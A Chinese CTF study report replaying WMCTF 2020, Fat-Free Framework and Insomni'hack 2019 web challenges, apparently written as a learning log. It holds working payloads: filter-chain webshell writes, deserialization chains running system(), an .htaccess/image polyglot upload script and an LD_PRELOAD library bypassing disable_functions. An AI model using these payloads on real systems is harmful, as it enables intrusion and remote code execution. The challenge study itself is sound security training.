# Nepnep学习报告 web第四周

- WMCTF 2020 部分题目复现
- Insomni hack teaser 2019 部分题目复现
- disable_functions 绕过
- php 过滤器巧用

## [WMCTF 2020] web check in 1.0/2.0

源码

```php
<?php 
//PHP 7.0.33 Apache/2.4.25 
error_reporting(0); 
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']); 
@mkdir($sandbox); 
@chdir($sandbox); 
highlight_file(__FILE__); 
if(isset($_GET['content'])) { 
    $content = $_GET['content']; 
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content)) 
         die('hacker'); 
    if(file_exists($content)) 
        require_once($content); 
    echo $content; 
    file_put_contents($content,'<?php exit();'.$content); 
} 
```

简明来说就是死亡 exit 绕过, 但是几乎所有的过滤器都禁用了, 官方还把 %25 ban了, 可以先看一下伪协议如何处理 url 编码这一类 payload

```php
static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* {{{ */
{
	char *p, *token = NULL;
	php_stream_filter *temp_filter;

	p = php_strtok_r(filterlist, "|", &token);
	while (p) {
		php_url_decode(p, strlen(p)); # 对过滤器进行了一次urldecode
		if (read_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->readfilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		if (write_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->writefilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		p = php_strtok_r(NULL, "|", &token);
	}
}
```

进入的时候 html 网页本身会解码一次, 然后写入文件时伪协议会对 url 编码的 payload 处理一次 payload, %25 被ban后就尝试寻找其它的二次编码突破口

```php
<?php
//$char = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$(){}[]"\'|\\/-+=*&^`~.';  # 构造全部的二次编码
for ($i = 0; $i < strlen($char); $i++) {
    for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
        for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
            $aaa = '%' . $ascii1 . '%' . $ascii2;
            if (urldecode(urldecode($aaa)) == $char[$i]) {
                echo $char[$i] . ': ' . $aaa;
                echo "\n";
            }
        }
    }
}
?>
```

可以得到一些比较常用的特别的二次编码

```
a: %6%31
b: %6%32
i: %6%39
q: %7%31
r: %7%32
u: %7%35
U: %5%35
```

测试了一下base64过滤器, 效果很差, 于是采用了 rot 和 iconv, 原题说是需要爆破临时文件才能得到解, 临时文件的命名规则如下: 

- 默认为 php+4或者6位随机数字和大小写字母

- php[0-9A-Za-z]{3,4,5,6}

然后就是通过爆破临时文件然后 require_once 包含木马, 研究过滤器后发现并不需要这么做

### 非预期

payload

```
# iconv 2次转换摧毁死亡函数 exit
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<hp pe@av(l_$OPTSh[ca]k;)>?/resource=ricky.php
# iconv+rot13 2次转换后解码摧毁死亡函数 exit
php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?<uc cr@ni(y_$BCGFu[pn]x;)>?|string.%7%32ot13|/resource=ricky.php
```

这两种方法即可直接破坏本身存在的 `<?php` 开头的任何文件, 分别会得到这样的文件内容

```
# iconv 2次转换摧毁死亡函数 exit
?<hp pxeti)(p;ph/:f/liet/rrwti=eocvnre.t6%c9no.v5%C5-SL2.E5%C5-SB2|E<?php @eval($_POST[hack]);?>r/seuocr=eirkc1yp.ph
# iconv+rot13 2此转换后解码摧毁死亡函数 exit
?<uc ckrgv)(c;cu/:s/yvrg/eejgv=rbpiaer.g6%p9ab.i5%P5-FY2.R5%P5-FO2|R<?php @eval($_POST[hack]);?>f|egav.t7%b21g|3e/frhbpe=rvexp.luc
```

这样直接访问沙盒里生成的文件就等同于获得了一个 shell, 然后就是访问根目录的 flag 文件 get shell

![20210419140652234](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419140652234.png)

WP中介绍了**字符串过滤器中的部分 **, **压缩过滤器**和**加密过滤器**, 再研究一下这三个冷门的过滤器

| 过滤器             | 作用                               |
| ------------------ | ---------------------------------- |
| zlib.deflate       | 压缩                               |
| zlib.inflate       | 解压                               |
| mcrypt.tripledes   | 加密                               |
| mdecrypt.tripledes | 解密                               |
| string.toupper     | 大写                               |
| string.tolower     | 小写                               |
| string.strip_tags  | 发生segment fault, 生成php临时文件 |

结合`zlib.deflate`和`zlib.inflate`使用后会发现**中间插入string.tolower转后会把空格和exit给处理了**

```
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_POST[hack]);?>/resource=ricky.php
```

官方的解法感觉特麻烦而且直接生成的 shell 根本不能在 file_put_contents 后直接使用, 爆破临时文件这个考点显得很鸡肋

## [WMCTF2020] webcheckin

/www.zip 查看源码

一个FatFramework的反序列化

```php
<?php

// Kickstart the framework
$f3=require('lib/base.php');

$f3->set('DEBUG',1);
if ((float)PCRE_VERSION<8.0)
	trigger_error('PCRE version is out of date');

// Load configuration
$f3->config('config.ini');

$f3->route('GET /',
	function($f3) {
		echo "just get me a,don't do anything else";
	}
);
unserialize($_GET['a']);

$f3->run();
```

需要反序列化首先就是全局搜索 __destruct(), 唯一可用的在 ws.php 里面的对象 Agent

```php
    function __destruct() {
        if (isset($this->server->events['disconnect']) &&
            is_callable($func=$this->server->events['disconnect']))
            $func($this);  # class Agent
    }
```

然后发现最终需要访问 Agent 类内的一个函数, 可以利用触发 __call 的只有函数 fetch

```php
    function fetch() {
        // Unmask payload
        $server=$this->server;
        if (is_bool($buf=$server->read($this->socket)))
            return FALSE;
```

`$this->server` 可控, 访问不存在的函数 read 触发 `__call`, 测试了一下, 对象 Base 是 final 类无法触发然后另外几个发现触发 `__call` 之后直接访问 `call_user_func_array`, 然后需要的是访问类和函数, `$func` 这个我们无法改动指定是 `read` 所以执行就会报错, 只有 DB/sql/mapper.php 里面不是直接传入 `$func` 并且 `$this->props[]` 可控

```php
	function __call($func,$args) {
		return call_user_func_array(
			(array_key_exists($func,$this->props)?
				$this->props[$func]:
				$this->$func),$args
		);
	}
```

然后测试发现直接使用 `CLI\Agent` 不行, 在 autoload 时会有文件包含错误, 导致反序列化时找不到类的定义, 先从 `CLI\WS` 入手, 让其包含正确的 `CLI\Agent` 定义文件(也就是需要在对象 Agent 上套一层 `CLI\WS` 的壳)

建立 exp.php 如下

```php
<?php
namespace DB\SQL {
    class Mapper {
        protected $props=[];
        function __construct($prop) {
            $this->props=$prop;
        }
    }
}

namespace CLI {
    class Agent
    {
        protected $server;
        protected $socket;

        public function __construct($server, $socket) {
            $this->server = $server;
            $this->socket = $socket;
        }
    }
    class WS {
        protected $events=[];
        public function __construct($events) {
            $this->events = $events;
        }
    }
}

namespace {
    class Basket {
        public $events = [];
        public function __construct($events) {
            $this->events = $events;
        }
    }
}

namespace {

    use CLI\Agent;
    use CLI\WS;
    use DB\SQL\Mapper;

    $a = new Mapper(array("read"=>"system"));
//    $b = new Agent($a, 'find / | grep flag');
    $b = new Agent($a, 'cat /etc/flagzaizheli');
    $c = new Basket(array("disconnect"=>array($b,"fetch")));
    $d = new Agent($c, '');
    $e = new WS($d);
    echo urlencode(serialize($e));
}
```

**补充**

 `CISCN2020 baby unserialize` 考察的也是 Fat Framework 的反序列化

源码

```php
<?php

// Kickstart the framework
$f3=require('lib/base.php');

if ((float)PCRE_VERSION<8.0)
    trigger_error('PCRE version is out of date');

$f3->route('GET /',
    function($f3) {
        echo "may be you need /?flag=";
    }
);

unserialize($_GET['flag']);

$f3->run();
```

全局搜索 `__destruct()`,  在jig.php中发现了write方法

```php
function __destruct() {
	if ($this->lazy) {
		$this->lazy = FALSE;
		foreach ($this->data?:[] as $file => $data)
			$this->write($file,$data);
	}
}
```

`$this->lazy` 可控, 跟进 write 函数

```php
function write($file,array $data=NULL) {
	if (!$this->dir || $this->lazy)
		return count($this->data[$file]=$data);
	$fw=\Base::instance();
	switch ($this->format) {
		case self::FORMAT_JSON:
			$out=json_encode($data,JSON_PRETTY_PRINT);
			break;
		case self::FORMAT_Serialized:
			$out=$fw->serialize($data);
			break;
	}
	return $fw->write($this->dir.$file,$out);
}
```

传入的值 `$data` 是一个数组, 然后就会进入到 base.php 中的write函数 

```php
function write($file,$data,$append=FALSE) {
		return file_put_contents($file,$data,$this->hive['LOCK']|($append?FILE_APPEND:0));
	}
```

把 `$data` 写入 `$file` 中, 很明显 `$this->dir` 和 `$data` 我们都可控, 就可以直接把🐎写入我们需要存放的位置, 建立 exp.php

```php
<?php
class Jig{
    const
        FORMAT_JSON=0,
        FORMAT_Serialized=1;
    protected
        //! UUID
        $uuid,
        //! Storage location
        $dir,
        //! Current storage format
        $format=self::FORMAT_JSON,
        //! Jig log
        $log,
        //! Memory-held data
        $this,
        //! lazy load/save files
        $lazy;
}
function __construct() {
$this->lazy = TRUE;
$this->data = ['ricky.php'=>['<?php eval($_POST[r]);?>']];
$this->dir = './';
}
$a = new Jig();
echo urlencode(serialize($a));
```

访问木🐎攻击即可

## [HUFU2021] unset

这个也是考察了 Fat Framework 的 unset 逃逸任意命令执行的漏洞, 源码

```php
<?php
// Kickstart the framework
$f3=require('lib/base.php');
$f3->set('DEBUG',1);
if ((float)PCRE_VERSION<8.0)
    trigger_error('PCRE version is out of date');
// Load configuration
highlight_file(__FILE__);
$a=$_GET['a'];
unset($f3->$a);
$f3->run(); 
```

直接拿 github 上的 Fat Framework 源码发现会报错, 出错在 base.php 的 eval 处, 然后审计一下上面的正则表达式

```php
$val=preg_replace('/^(\$hive)/','$this->hive',
   $this->compile('@hive.'.$key, FALSE));     
eval('unset('.$val.');');
```

因为该 正则表达式 是单行匹配 `/^(\$hive)/`, 所以加了换行符以后下面的语句作为单独的一条 php 语句进行处理, 不会进入 `'@hive'.$key` 的拼接

![20210419214824484](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419214824484.png)

少了换行符时

![20210419214839882](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210419214839882.png)

payload

```
?a='ricky'%0a);phpinfo();//
?a='ricky'%0a);system('cat /flag');//
```

## [Insomni hack teaser 2019] Phuck2

源码

```php
<?php
    stream_wrapper_unregister('php');
    if(isset($_GET['hl'])) highlight_file(__FILE__);

    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };
    $randFolder = bin2hex(random_bytes(16));
    $mkdir('users/'.$randFolder);
    chdir('users/'.$randFolder);

    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    chdir('..');
    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }

    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);

?>
```

可以发现这题最终需要 `include($_GET['page'])` 包含文件来进行RCE

` stream_wrapper_unregister ` 限制了我们不能用常规的 php 过滤器包含文件

`escapeshellarg` 保证了 system 的安全性

```php
$randFolder = bin2hex(random_bytes(16));
$mkdir('users/'.$randFolder);
chdir('users/'.$randFolder);
```

为了隔离每个用户的, 防止互相干扰, 往下看

```php
$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));
```

这两行表示从 `X-FORWARDED-FOR` 去获取数据作为用户的文件夹名 userFolder

```php
file_put_contents('profile',print_r($_SERVER,true));
chdir('..');
$_GET['page']=str_replace('.','',$_GET['page']);
if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
    include($_GET['page']);
}
```

这一块会把所有 HTTP头 和信息写入  `X-FORWARDED-FOR/profile` 里面, 写入的文件不让含有 `<?` 和 `php` , 考的是 **include() 与 file_get_contents() 的Data URI识别** , 类型是 **data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh** 

> file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 include data URI 的，但是如果 `data:,XXX` 是一个目录名的话，就会放开限制。

sample

![20210422160610781](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422160610781.png)

通过这个漏洞可以包含写入的 profile 文件

![20210422161233845](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422161233845.png)

****

## [Insomni hack teaser 2019] l33t-hoster

F12 /?source 查看源码

源码

```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>
```

上传文件有以下几个限制:

- 上传的文件不能有PHP扩展名（`.php`，`.php3`，`.phar`，...）
- 上传的文件不能包含 `<?`
- 上传的文件必须是大小为 1337*1337 的有效图像

上传 **.htaccess** 文件可以解决这个问题，但是由于图像限制，我们需要找到一种方法来创建有效的 **.htaccess/image **多语意文件

### 寻找 .htaccess/image 多语意文件

每个图像文件格式都以一些魔术字节开头，以此来定义自身类型。例如，PNG将以4个字节 `\x89PNG` 开头。由于 `\x89PNG` 不是有效的 .htaccess 指令，因此我们无法将PNG文件格式用于我们的多语意文件中。

因此，我首先尝试寻找一个签名开头带有 `#` 符号的文件格式。由于 `#` 符号被解释为.htaccess文件中的注释，因此将忽略图像数据的其余部分，从而生成有效的.htaccess/image多语意文件。

但是没有以 `#` 开头的图像文件格式。但是 .htaccess 文件也会忽略以空字节（`\x00`）开头的行，这和注释（`#`）一样。

查看 `exif_imagetype()` 支持的图像类型，可以下载每种类型的样本并寻找以空字节开头的签名。  

> **exif_imagetype()** 读取一个图像的第一个字节并检查其签名。 

| 版本  | 说明                                   |
| :---- | :------------------------------------- |
| 4.3.2 | 支持 JPC，JP2，JPX，JB2，XBM 以及 WBMP |
| 4.3.0 | 支持 SWC                               |

 **图像类型常量**

| 值   | 常量                                         |
| :--- | :------------------------------------------- |
| 1    | **`IMAGETYPE_GIF`**                          |
| 2    | **`IMAGETYPE_JPEG`**                         |
| 3    | **`IMAGETYPE_PNG`**                          |
| 4    | **`IMAGETYPE_SWF`**                          |
| 5    | **`IMAGETYPE_PSD`**                          |
| 6    | **`IMAGETYPE_BMP`**                          |
| 7    | **`IMAGETYPE_TIFF_II`**（Intel 字节顺序）    |
| 8    | **`IMAGETYPE_TIFF_MM`**（Motorola 字节顺序） |
| 9    | **`IMAGETYPE_JPC`**                          |
| 10   | **`IMAGETYPE_JP2`**                          |
| 11   | **`IMAGETYPE_JPX`**                          |
| 12   | **`IMAGETYPE_JB2`**                          |
| 13   | **`IMAGETYPE_SWC`**                          |
| 14   | **`IMAGETYPE_IFF`**                          |
| 15   | **`IMAGETYPE_WBMP`**                         |
| 16   | **`IMAGETYPE_XBM`**                          |

`.wbmp` 文件适合使用：

[wbmp 转换文件](https://cn.office-converter.com/free-wbmp-converter)

```sh
$ xxd test.wbmp | head
00000000: 0000 8146 810e ffff ffff ffff ffff ffff  ...F............
00000010: ffff ffff ffff ffff ffff ffff ffff fcff  ................
00000020: ffff ffff ffff ffff ffff ffff 03ff ffff  ................
00000030: ffff ffff ffff fffc ffff ffff ffff ffff  ................
```

### 创建 .htaccess/image 多语意文件

创建一个 .htaccess.image 多语意文件

```php
<?php

error_reporting(0);

$contents = file_get_contents("../payloads/original.wbmp");
$i = 0;
while (true) {
  $truncated = substr($contents, 0, $i);
  file_put_contents("truncated.wbmp", $truncated);
  if (exif_imagetype("truncated.wbmp")) break;

  $i += 1;
}

echo "Shortest file size : $i\n";

var_dump(exif_imagetype("truncated.wbmp"));
var_dump(getimagesize("truncated.wbmp"));
?>
```

输出结果为

```php
$ php solution.php && xxd truncated.wbmp
Shortest file size : 6
int(15)
array(5) {
  [0]=>
  int(1200)
  [1]=>
  int(800)
  [2]=>
  int(15)
  [3]=>
  string(25) "width="1200" height="800""
  ["mime"]=>
  string(18) "image/vnd.wap.wbmp"
 }

00000000: 0000 8930 8620           
```

定义一个有效的 `.wbmp` 文件只需要6个字节，我们可以假设宽度和高度在第3至第6字节存储。通过hex editor，你可以修改这些字节来得到1337x1337的大小 

```sh
$ xxd truncated.wbmp
00000000: 0000 8a39 8a39                           ...9.9
```

### 找到php代码执行方法

既然可以上传.htaccess文件，下一步就是找到代码执行的方式。由于`被过滤，不能简单地上传PHP脚本并让它执行。

`php_value`是 .htaccess 文件中可以用的指令之一。该指令允许我们使用`PHP_INI_PERDIR`标志修改[此处列表](http://php.net/manual/en/ini.list.php)里的任何设置。

在这些设置中，有个 `auto_append_file` ，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，`auto_append_file` 还允许各种包装器，如`php://`。

上传一个.htaccess文件，设置扩展名为`.ricky`的文件当做PHP执行，并在最后添加 `php://filter/convert.base64-encode/resource=shell.ricky`

脚本如下

```python
#!/usr/bin/env python3
# -*-coding:utf-8-*-

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://38f0cae3-850b-4ce3-b8ab-7f368b745941.node3.buuoj.cn/"
RANDOM_DIRECTORY = "4b908db0cb4511f942feb821a226ba66c216daad"  # 上传后刷新查到目录再进行修改

COOKIES = {
    "PHPSESSID": "e2s5o4f9dud4rjesdovgmgf877"}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .ricky
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.ricky"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
  eval($_POST[ricky]);
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.ricky", TARGET_FILE)
upload_content("trigger.ricky", VALID_WBMP)


response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.ricky")
print(response.text)
```

上传木马后蚁剑链接用 `PHP7_GC_UAF` 即可命令执行, 发现执行 /get_flag 有个验证码(此处为[参考](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/exploit.pl))

```c
#!/usr/bin/env perl 
use warnings;
use strict;
use IPC::Open2;

$| = 1;
chdir "/"; #!!!!!!!!!!!!!!!!!!!!!!!!!!

my $pid = open2(\*out2, \*in2, './get_flag') or die;

my $reply = <out2>;
print STDOUT $reply; #string: solve captcha..
$reply = <out2>;
print STDOUT $reply; #captcha formula

my $answer = eval($reply);
print STDOUT "answer: $answer\n"; 

print in2 " $answer "; #send it to process
in2->flush();

$reply = <out2>;
print STDOUT $reply; #flag :D
```

发现上传文件这一块直接用脚本不太好使, 用 mail() 函数绕过

> PHP的 `mail()` 函数调用 `execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], ...)` 。由于这种实现，如果我们使用自写动态库设置环境变量 `LD_PRELOAD` ，从而修改 `/bin/sh` 的行为并获得命令执行。 

即使 `/usr/sbin/sendmail` 不存在, 也可以使用, 重写 `getuid()` 函数

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
  char buf[512];
  strcpy(buf, cmd);
  strcat(buf, " > /tmp/_0utput.txt");
  system(buf);}

int getuid() {
  char *cmd;
  if (getenv("LD_PRELOAD") == NULL) { return 0; }
  unsetenv("LD_PRELOAD");
  if ((cmd = getenv("_evilcmd")) != NULL) {
    payload(cmd);
  }
  return 1;
}
```

编译

```
gcc -Wall -fPIC -shared -o evil.so evil.c -ldl
```

采用 `move_uploaded_file` 函数进行多文件上传, 最后的 python 脚本如下

```python
#!/usr/bin/env python3
# -*-coding:utf-8-*-

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://38f0cae3-850b-4ce3-b8ab-7f368b745941.node3.buuoj.cn/"
RANDOM_DIRECTORY = "4b908db0cb4511f942feb821a226ba66c216daad"  # 上传后刷新查到目录再进行修改

COOKIES = {
    "PHPSESSID": "e2s5o4f9dud4rjesdovgmgf877"}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .ricky
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.ricky"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php

// Upload the solver and shared library
move_uploaded_file($_FILES['captcha_solver']['tmp_name'], '/tmp/captcha_solver');
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/evil_lib');

// Set the captcha_solver as executable
putenv('LD_PRELOAD=/tmp/evil_lib');
putenv("_evilcmd=chmod +x /tmp/captcha_solver");
mail('a','a','a');

// Run the captcha solver
putenv("_evilcmd=cd / && /tmp/captcha_solver");
mail('a','a','a');

// Print output
echo file_get_contents('/tmp/_0utput.txt');
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.ricky", TARGET_FILE)
upload_content("trigger.ricky", VALID_WBMP)

files = {"evil": open("./evil.so", "rb"), "captcha_solver": open("./exploit.pl", "rb")}
response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.ricky", files=files)
print(response.text)
```

结果

![20210422183028423](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422183028423.png)

## 小结

- php过滤器

iconv|UCS|UTF|rot|quoted|base64|zlib.deflate|zlib.inflate|toupper|tolower|strip_tags

- file_get_contents() 与 include() 包含 data url 的区别 

- mail() 函数绕过 disable_functions